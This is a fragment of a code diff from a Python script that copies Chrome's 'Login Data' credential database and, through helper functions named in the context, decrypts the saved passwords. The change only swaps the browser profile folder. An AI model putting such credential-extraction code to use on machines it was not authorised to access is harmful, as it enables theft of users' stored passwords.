@@ -61,7 +61,7 @@ def password_decryption(password, encryption_key):
 def main():
     key = fetching_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "Profile 15", "Login Data")
+                           "Google", "Chrome", "User Data", "Profile 1", "Login Data")
     filename = "ChromePasswords.db"
     shutil.copyfile(db_path, filename)
       
